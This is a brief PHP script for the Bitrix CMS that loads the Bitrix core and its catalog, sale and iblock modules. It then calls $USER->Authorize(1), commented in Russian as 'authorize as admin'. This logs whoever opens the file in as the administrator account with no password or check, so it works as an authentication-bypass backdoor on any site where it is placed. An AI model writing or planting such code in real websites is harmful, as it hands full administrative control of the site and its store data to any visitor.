 <?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
CModule::IncludeModule("catalog");
CModule::IncludeModule("sale");
CModule::IncludeModule("iblock");
  global   $USER ;
 $USER ->Authorize( 1 );  // авторизуем админом  
?>